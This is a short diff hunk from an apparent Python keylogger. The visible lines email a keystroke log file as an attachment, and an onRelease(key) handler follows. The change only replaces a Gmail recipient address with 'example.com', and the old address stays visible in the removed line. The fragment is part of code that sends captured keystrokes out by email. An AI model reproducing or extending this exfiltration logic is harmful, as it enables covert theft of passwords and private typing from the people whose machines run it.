@@ -89,7 +89,7 @@ def send_email(filename, attachment, toaddr):
     s.sendmail(fromaddr, toaddr, text)
     s.quit()
 
-toaddr = "howardwu35@gmail.com"
+toaddr = "example.com"
 send_email(key_log, file_path + key_log, toaddr)
 
 def onRelease(key):
